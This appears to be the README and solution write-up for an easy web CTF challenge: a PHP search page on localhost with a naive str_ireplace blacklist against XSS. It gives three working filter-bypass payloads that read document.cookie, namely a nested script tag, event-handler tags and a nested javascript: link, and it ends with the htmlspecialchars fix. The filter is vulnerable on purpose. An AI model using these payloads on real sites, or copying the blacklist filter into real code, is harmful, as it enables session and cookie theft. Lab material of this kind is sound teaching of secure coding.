# PHP XSS Filter Bypass — CTF Challenge

**Category:** Web  
**Difficulty:** Easy-Medium  

## Description

A search portal reflects your query back on the page. The developer added a WAF to block XSS — but it's not enough. Bypass the filter and execute JavaScript to steal the flag from `document.cookie`.

## Setup

```bash
docker compose up --build
```

Then visit: http://localhost:8081

## The Filter

```php
function waf($input) {
    $input = str_ireplace('<script>', '', $input);
    $input = str_ireplace('</script>', '', $input);
    $input = str_ireplace('javascript:', '', $input);
    return $input;
}
```

## Why It Fails

`str_ireplace` is **not recursive** — it runs once and stops. This leaves three bypass paths:

---

### Bypass 1 — Nested script tag (str_ireplace blind spot)

The filter strips `<script>` from your input once. If `<script>` is embedded inside itself, removing it reveals another `<script>`:

```
Input:   <scr<script>ipt>alert(document.cookie)</scr</script>ipt>
After:   <script>alert(document.cookie)</script>   ← XSS
```

URL: `?q=<scr<script>ipt>alert(document.cookie)</scr</script>ipt>`

---

### Bypass 2 — HTML event handlers (completely unfiltered)

The WAF only blocks `<script>` and `javascript:`. It never touches HTML event attributes, so any tag with an event handler works:

```
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(document.cookie)>
<body onresize=alert(document.cookie)>
<details ontoggle=alert(document.cookie) open>
```

URL: `?q=<img src=x onerror=alert(document.cookie)>`

---

### Bypass 3 — javascript: with nested strip

Same non-recursive trick applies to the `javascript:` filter:

```
Input:  <a href="javajascript:script:alert(document.cookie)">click</a>
After:  <a href="javascript:alert(document.cookie)">click</a>   ← XSS on click
```

---

## The Fix

Use a proper escaping function instead of a blacklist:

```php
// Correct — escapes all HTML special chars
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

Blacklist-based filters always lose. There are too many valid HTML/JS constructs to block them all.
